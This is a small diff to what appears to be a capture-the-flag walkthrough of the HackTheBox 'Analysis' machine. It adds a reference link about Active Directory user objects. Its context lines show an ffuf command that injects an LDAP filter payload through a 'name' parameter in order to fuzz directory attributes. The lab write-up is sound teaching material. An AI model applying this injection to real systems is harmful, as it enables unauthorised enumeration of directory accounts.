@@ -483,6 +483,8 @@ userAccountControl      [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 
 
 We know the the value of the `objectClass` attribute should be `user` since `technician` is a user. So we can try set this attribute, and continue our fuzzing journey:
 
+> [Active Directory User Object: An Introduction](https://www.windows-active-directory.com/active-directory-user-objects-management.html).
+
 ```bash
 $ ffuf -u 'http://internal.analysis.htb/users/list.php?name=technician)(%26(objectClass=user)(FUZZ=*)' -w /usr/share/seclists/Fuzzing/LDAP-active-directory-attributes.txt -ac -c
 
